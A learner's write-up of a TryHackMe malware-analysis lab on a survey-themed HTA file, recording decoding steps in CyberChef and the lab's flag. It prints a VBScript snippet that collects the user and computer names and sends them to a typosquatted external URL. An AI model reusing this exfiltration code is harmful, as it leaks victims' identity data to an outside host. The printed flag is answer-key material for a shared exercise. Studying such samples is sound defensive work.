# Day 21 – Malware Analysis - Malhare.exe

## 🎯 Objectives

Learn to find the following parts in malicious code:

- Application metadata
- Script functions
- Any network calls or encoded data
- Clues about exfiltration
   
---

## 🖥️ Environment

- **Platform:** TryHackMe  
- **Tools used:** Cyberchef
---

## 🔍 Approach

Today's task is all about understanding HTA code, how it's used and to find what is malicious about it.

The first part of the task had us inspect HTA code which on the surface level looked like an employee survey. When we did further digging we found that file was exfiltrating data from the victim machine onto a typequatted URL endpoint.

The below code is the main indicator that the data is getting captured and exfiltrated.

```
		strHost = CreateObject("WScript.Network").ComputerName
		strUser = CreateObject("WScript.Network").UserName
		
		Dim IE
		Set IE = CreateObject("InternetExplorer.Application")
		IE.navigate2 "http://survey.bestfestiivalcompany.com/details?u=" & strUser & "?h=" & strHost
```

For the final part of the task we analysed the `HTML` code of the malicious endpoint to which the data was exfiltrated. This was all obfuscated and we used the `Magic` function on `CyberChef` to discover that `base64` was used to do this. Unfortunately this didn't reveal all the code in plain text and we used the `Magic` function again to discover that `ROT13` was used for the remainder.

Once decoded this revealed the flag for the task.

---

## ⚠️ Challenges

- Interpeting the code correctly and understanding why it's malicious.

---

## 🚩 Flags

- THM{Malware.Analysed}
---

## 📚 Lessons Learned

Learned how malicious code can be embedded into apps that look legitimately. Also learned how obfuscation is used to try and hide this.

---

## 💭 Further Thoughts

It was great to work with CyberChef again and definitely felt more comfortable using it. Would like to brush up on my general coding knowledge (mainly powershell) so it would be easier for me to understand what's happening in te code.
